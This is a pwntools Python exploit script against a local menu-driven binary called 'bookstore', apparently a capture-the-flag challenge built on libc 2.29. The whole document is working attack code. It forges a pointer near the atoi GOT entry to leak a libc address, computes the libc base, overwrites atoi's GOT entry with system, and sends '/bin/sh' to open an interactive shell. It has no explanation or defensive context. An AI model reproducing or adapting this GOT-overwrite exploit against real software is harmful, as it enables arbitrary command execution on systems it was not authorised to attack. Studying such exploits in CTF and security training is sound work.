from pwn import *

###Util
def add(name,year,target):
    r.sendafter('Choice : ',b'1       '+p64(target))
    r.sendlineafter('book? ',name)
    r.sendlineafter('published? ',str(year))

def delete(name,year,idx):
    r.sendlineafter('Choice : ','2')
    r.sendlineafter('book? ',name)
    r.sendlineafter('published? ',str(year))
    r.sendlineafter('delete? ',str(idx))

def update(name,year,info):
    r.sendlineafter('Choice : ','3')
    r.sendlineafter('book? ',name)
    r.sendlineafter('published? ',str(year))
    r.sendafter('Description : ',info)

def show():
    r.sendlineafter('Choice : ','4')
    return r.recvuntil('\n           Action List')[:-23]

def getshell():
    r.sendlineafter('Choice : ','/bin/sh')

###Addr
#  libc2.29
atoi_got = 0x404050
atoi_offset = 0x3b970
system_offset = 0x47850


###Exploit
r = process('./bookstore')

add('a',2000,atoi_got-104)
leaks = show().split(b'\n')
fakename = leaks[0][5:]
fakeyear = int(leaks[1][5:])
atoi_addr = u64(leaks[2][5:].ljust(8,b'\x00'))
libc_base = atoi_addr-atoi_offset

update(fakename,fakeyear,p64(libc_base+system_offset))

getshell()
r.interactive()
